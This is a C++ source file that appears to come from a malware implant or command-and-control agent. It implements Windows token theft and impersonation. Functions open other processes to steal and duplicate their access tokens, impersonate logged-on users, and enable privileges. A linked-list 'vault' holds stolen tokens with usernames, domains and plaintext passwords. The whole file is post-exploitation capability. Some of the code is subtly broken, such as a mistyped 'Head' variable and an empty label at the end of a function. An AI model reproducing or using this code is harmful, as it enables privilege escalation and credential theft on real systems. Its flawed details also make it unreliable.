#include <commands/include/tokens.hpp>
namespace Token {

	BOOL RevertToken() {
		HEXANE

		HANDLE hToken = { };
		if (NT_SUCCESS(ntstatus = Ctx->Nt.NtSetInformationThread(NtCurrentThread(), ThreadImpersonationToken, &hToken, sizeof(HANDLE)))) {
			return TRUE;
		}

		return FALSE;
	}

	BOOL TokenImpersonate(BOOL Impersonate) {
		HEXANE

		BOOL Success = FALSE;
		if (Impersonate && !Ctx->Tokens.Impersonate && Ctx->Tokens.Token) {
			if (!(Ctx->Tokens.Impersonate = Ctx->win32.ImpersonateLoggedOnUser(Ctx->Tokens.Token->Handle))) {
				return_defer(ERROR_CANNOT_IMPERSONATE);
			}
		} else if (!Impersonate && Ctx->Tokens.Impersonate) {
			Ctx->Tokens.Impersonate = FALSE;
			Success = RevertToken();

		} else if (Impersonate && !Ctx->Tokens.Token) {
			Success = TRUE;
		} else if (Impersonate && Ctx->Tokens.Impersonate) {
			Success = TRUE;
		} else if (Impersonate && !Ctx->Tokens.Impersonate) {
			Success = TRUE;
		}

		defer:
		return Success;
	}

	VOID DuplicateToken(HANDLE orgToken, DWORD Access, SECURITY_IMPERSONATION_LEVEL Level, TOKEN_TYPE Type, PHANDLE newToken) {
		HEXANE

		OBJECT_ATTRIBUTES Attrs				= { };
		SECURITY_QUALITY_OF_SERVICE Sqos	= { };

		Sqos.Length				    = sizeof(SECURITY_QUALITY_OF_SERVICE);
		Sqos.ImpersonationLevel     = Level;
		Sqos.ContextTrackingMode	= 0;
		Sqos.EffectiveOnly			= FALSE;

		InitializeObjectAttributes(&Attrs, nullptr, 0, nullptr, nullptr);
		Attrs.SecurityQualityOfService = &Sqos;

		ntstatus = Ctx->Nt.NtDuplicateToken(orgToken, Access, &Attrs, FALSE, Type, newToken);
	}

	VOID SetTokenPrivilege(LPWSTR Privilege, BOOL Enable) {
		HEXANE

		TOKEN_PRIVILEGES tokenPriv	= { };
		HANDLE hToken 				= { };
		LUID Luid 					= { };

		if (!LookupPrivilegeValueW(nullptr, Privilege, &Luid)) {
			return_defer(ERROR_PRIVILEGE_NOT_HELD);
		}

		tokenPriv.PrivilegeCount		= 1;
		tokenPriv.Privileges[0].Luid	= Luid;

		Enable
		? tokenPriv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED
		: tokenPriv.Privileges[0].Attributes = NULL;

		if (
			!NT_SUCCESS(Ctx->Nt.NtOpenProcessToken(NtCurrentProcess(), TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY, &hToken)) ||
			!Ctx->win32.AdjustTokenPrivileges(hToken, FALSE, &tokenPriv, 0, nullptr, nullptr)) {
			return_defer(ERROR_INVALID_TOKEN);
		}

		defer:
	}

	HANDLE StealProcessToken(HANDLE hTarget, DWORD Pid) {
		HEXANE

		HANDLE hProcess		= { };
		HANDLE hDuplicate	= { };

		if (!NT_SUCCESS(Process::NtOpenProcess(&hProcess, PROCESS_QUERY_INFORMATION | PROCESS_DUP_HANDLE, Pid))) {
			return_defer(ntstatus);
		}

		if (hTarget) {
			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtDuplicateObject(hProcess, hTarget, NtCurrentProcess(), &hDuplicate, 0, 0, DUPLICATE_SAME_ACCESS))) {
				return_defer(ntstatus);
			}
		} else {
			if (!NT_SUCCESS(ntstatus = Ctx->Nt.NtOpenProcessToken(hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hDuplicate))) {
				return_defer(ntstatus);
			}
		}

		defer:
		if (hProcess) {
			Ctx->Nt.NtClose(hProcess);
		}

		return hDuplicate;
	}

	_token_list_data* GetToken(DWORD tokenId) {
		HEXANE

		_token_list_data *head = Ctx->Tokens.Vault;
		uint32_t index = 0;

		for ( ;index < tokenId && head && head->Next; ++index) {
			head = head->Next;
		}
		if (index != tokenId) {
			return nullptr;
		}

		return head;
	}

	DWORD AddToken(HANDLE token, LPWSTR username, SHORT type, DWORD pid, LPWSTR domain_user, LPWSTR domain, LPWSTR password) {
		HEXANE

		_token_list_data *head	= { };
		_token_list_data *entry	= { };
		DWORD Index				= 0;

		entry = R_CAST(_token_list_data*, Ctx->Nt.RtlAllocateHeap(Ctx->Heap, 0, sizeof(_token_list_data)));

		entry->Handle		= token;
		entry->lpUser		= username;
		entry->dwProcessID	= pid;
		entry->Type			= type;
		entry->DomainUser	= domain_user;
		entry->lpDomain		= domain;
		entry->lpPassword	= password;
		entry->Next			= nullptr;

		if (Ctx->Tokens.Vault == nullptr) {
			Ctx->Tokens.Vault = entry;
			return Index;
		}

		head = Ctx->Tokens.Vault;
		while (head->Next) {
			head = Head->Next;
			Index++;
		}

		head->Next = entry;
		Index++;

		return Index;
	}

	BOOL RemoveToken(const uint32_t token_id) {
		HEXANE

		_token_list_data *head	= Ctx->Tokens.Vault;
		_token_list_data *entry	= GetToken(token_id);
		_token_list_data *prev	= { };

		if (!entry) {
			return FALSE;
		}

		while (head) {
			if (head == entry) {
				if (head == Ctx->Tokens.Vault) {
					Ctx->Tokens.Vault = entry->Next;

				} else {
					prev = Ctx->Tokens.Vault;
					while (prev && prev->Next != entry) {
						prev = prev->Next;
					}
					if (prev) {
						prev->Next = entry->Next;
					}
				}

				if (Ctx->Tokens.Impersonate && Ctx->Tokens.Token->Handle == entry->Handle) {
					TokenImpersonate(FALSE);
				}

				if (entry->Handle) {
					Ctx->Nt.NtClose(entry->Handle);
					entry->Handle = nullptr;
				}

				if (entry->DomainUser) {
					x_memset(entry->DomainUser, 0, x_wcslen(entry->DomainUser) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->DomainUser);
					entry->DomainUser = nullptr;
				}

				if (entry->lpUser) {
					x_memset(entry->lpUser, 0, x_wcslen(entry->lpUser) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpUser);
					entry->lpUser = nullptr;
				}

				if (entry->lpDomain) {
					x_memset(entry->lpDomain, 0, x_wcslen(entry->lpDomain) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpDomain);
					entry->lpDomain = nullptr;
				}

				if (entry->lpPassword) {
					x_memset(entry->lpPassword, 0, x_wcslen(entry->lpPassword) * sizeof(WCHAR));
					Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry->lpPassword);
					entry->lpPassword = nullptr;
				}

				x_memset(entry, 0, sizeof(TOKEN_LIST_DATA));
				Ctx->Nt.RtlFreeHeap(Ctx->Heap, 0, entry);

				return TRUE;
			}

			head = head->Next;
		}

		return FALSE;
	}
}
